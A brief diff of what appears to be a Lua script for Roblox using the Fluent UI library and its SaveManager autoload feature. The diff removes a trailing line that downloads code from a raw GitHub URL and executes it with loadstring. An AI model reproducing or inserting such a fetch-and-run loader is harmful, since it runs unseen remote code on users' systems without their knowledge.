@@ -99,5 +99,3 @@ Fluent:Notify({
 -- which has been marked to be one that auto loads!
 SaveManager:LoadAutoloadConfig()
 end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Qrto1/testif/main/itself"))()
